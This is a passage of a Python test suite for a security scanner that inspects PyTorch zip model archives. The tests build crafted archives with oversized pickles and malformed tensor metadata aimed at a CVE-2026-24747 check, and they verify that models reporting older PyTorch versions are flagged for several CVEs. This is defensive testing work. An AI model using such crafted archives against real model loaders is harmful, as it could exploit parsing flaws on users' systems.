    assert parse_complete is True
    assert mismatches

    zip_path = tmp_path / "late_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", bytes(pkl_data))
        zipf.writestr("archive/data/0", b"\x00" * 24)

    result = scanner.scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_tensor_metadata_validation_truncated" in result.metadata["scan_outcome_reasons"]
    truncation_checks = [
        check
        for check in result.checks
        if check.name == "CVE-2026-24747 Tensor Metadata Validation"
        and check.details.get("analysis_incomplete") is True
    ]
    assert truncation_checks
    assert truncation_checks[0].message == (
        f"Tensor metadata validation only inspected the first {max_pkl_read} bytes "
        "of oversized pickle member archive/data.pkl"
    )
    assert truncation_checks[0].details["max_read_bytes"] == max_pkl_read


def test_pytorch_zip_tensor_metadata_large_auxiliary_pickle_stays_clean(tmp_path: Path) -> None:
    """Oversized non-storage sidecar pickles must not poison otherwise valid archives."""
    zip_path = tmp_path / "large_auxiliary_pickle.pt"
    payload = b"A" * ((10 * 1024 * 1024) + 1024)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02N.")
        zipf.writestr("archive/data/0", b"\x00" * 24)
        zipf.writestr("archive/constants.pkl", b"\x80\x02B" + struct.pack("<I", len(payload)) + payload + b".")

    scanner = PyTorchZipScanner()
    result = scanner._create_result()
    scanner.current_file_path = str(zip_path)
    with zipfile.ZipFile(zip_path, "r") as zipf:
        safe_entries = zipf.infolist()
        pickle_files = scanner._discover_pickle_files(zipf, safe_entries, result)
        scanner._validate_tensor_metadata_consistency(zipf, safe_entries, pickle_files, result, str(zip_path))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert not any(
        check.name == "CVE-2026-24747 Tensor Metadata Validation" and check.details.get("analysis_incomplete") is True
        for check in result.checks
    )


def _assert_pytorch_zip_inconclusive_not_cached(
    path: Path,
    cache_dir: Path,
    reason: str,
    *,
    expected_success: bool,
    expected_exit_code: int,
    **scan_kwargs: Any,
) -> None:
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert aggregate.success is expected_success
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata["scan_outcome_reasons"]
            assert determine_exit_code(aggregate) == expected_exit_code
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pytorch_zip_entry_limit_is_exit1_and_not_cached(tmp_path: Path) -> None:
    zip_path = create_mock_pytorch_zip(tmp_path / "entry-limit.pt", data={})
    with zipfile.ZipFile(zip_path, "a") as zipf:
        zipf.writestr("archive/entry_0.txt", "data")
        zipf.writestr("archive/entry_1.txt", "data")
    with zipfile.ZipFile(zip_path, "r") as zipf:
        max_archive_entries = len(zipf.infolist()) - 1

    _assert_pytorch_zip_inconclusive_not_cached(
        zip_path,
        tmp_path / "entry-limit-cache",
        "pytorch_zip_entry_limit",
        expected_success=True,
        expected_exit_code=1,
        max_archive_entries=max_archive_entries,
    )


def test_pytorch_zip_version_metadata_limit_is_exit2_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = tmp_path / "oversized-version-metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", b"3" + (b" " * 8))
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))

    monkeypatch.setattr(PyTorchZipScanner, "MAX_VERSION_METADATA_BYTES", 8)
    _assert_pytorch_zip_inconclusive_not_cached(
        zip_path,
        tmp_path / "version-metadata-limit-cache",
        PyTorchZipScanner.VERSION_METADATA_LIMIT_INCONCLUSIVE_REASON,
        expected_success=False,
        expected_exit_code=2,
    )


def test_pytorch_zip_tensor_metadata_parse_failure_is_exit1_and_not_cached(tmp_path: Path) -> None:
    zip_path = tmp_path / "malformed_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02B")
        zipf.writestr("archive/data/0", b"\x00" * 24)

    _assert_pytorch_zip_inconclusive_not_cached(
        zip_path,
        tmp_path / "parse-failure-cache",
        "pytorch_zip_tensor_metadata_validation_failed",
        expected_success=True,
        expected_exit_code=1,
    )


def test_pytorch_zip_tensor_metadata_truncation_preserves_origin_warning_precedence(tmp_path: Path) -> None:
    max_pkl_read = 10 * 1024 * 1024
    payload = b"A" * (max_pkl_read + 1024)
    zip_path = tmp_path / "late_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr(
            "archive/data.pkl",
            b"\x80\x02B"
            + struct.pack("<I", len(payload))
            + payload
            + b"0ctorch._utils\n_rebuild_tensor_v2\n\x8c\x010J"
            + struct.pack("<i", 1_000_000)
            + b".",
        )
        zipf.writestr("archive/data/0", b"\x00" * 24)

    requires_origin_review = import_only_module_requires_origin_review("torch._utils", "_rebuild_tensor_v2")
    _assert_pytorch_zip_inconclusive_not_cached(
        zip_path,
        tmp_path / "truncation-cache",
        "pytorch_zip_tensor_metadata_validation_truncated",
        expected_success=requires_origin_review,
        expected_exit_code=1 if requires_origin_review else 2,
    )


# --- CVE-2022-45907 version check tests ---


def test_pytorch_zip_cve_2022_45907_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2022-45907."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "1.13.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2022-45907" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 1.13.0 as vulnerable to CVE-2022-45907. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "1.13.0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2022-45907", "1.13.0")


def test_pytorch_zip_cve_2022_45907_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2022-45907."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "1.13.1")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2022-45907" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 1.13.1 should NOT trigger CVE-2022-45907. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


# --- CVE-2024-5480 version check tests ---


def test_pytorch_zip_cve_2024_5480_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2024-5480."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.2.2")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2024-5480" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.2.2 as vulnerable to CVE-2024-5480. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.2.2"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2024-5480", "2.2.2")


def test_pytorch_zip_cve_2024_5480_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2024-5480."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.2.3")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2024-5480" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 2.2.3 should NOT trigger CVE-2024-5480. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


# --- CVE-2024-48063 version check tests ---


def test_pytorch_zip_cve_2024_48063_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2024-48063."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.4.1")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2024-48063" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.4.1 as vulnerable to CVE-2024-48063. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.4.1"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2024-48063", "2.4.1")


def test_pytorch_zip_cve_2024_48063_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2024-48063."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.5.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2024-48063" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 2.5.0 should NOT trigger CVE-2024-48063. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


def test_version_suffix_handling_for_cve_checks() -> None:
    """Version helper should treat unknown suffixes as vulnerable and known post/build as fixed."""
    scanner = PyTorchZipScanner()

    assert scanner._looks_like_pytorch_version("2.10.0a0") is True
    assert scanner._looks_like_pytorch_version("2.2.3rc1") is True

    # Known safe suffixes on fixed base version
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3+cu118", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3.post1", 2, 2, 3) is False

    # Known pre-release suffixes on fix version are still vulnerable
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3a1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3b1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3rc1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3.dev0", 2, 2, 3) is True

    # Short prereleases above the fix release should not become false positives
    assert scanner._is_vulnerable_pytorch_version_for("2.5.1a1", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version_for("2.5.1b1", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version("2.6.1a1") is False
    assert scanner._is_vulnerable_pytorch_version_2026("2.10.1a1") is False

    # Prereleases of each fixed version remain vulnerable.
    assert scanner._is_vulnerable_pytorch_version("2.6.0a0") is True
    assert scanner._is_vulnerable_pytorch_version_2026("2.10.0a0") is True

    # Unknown suffix semantics -> conservative vulnerable
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3foobar", 2, 2, 3) is True
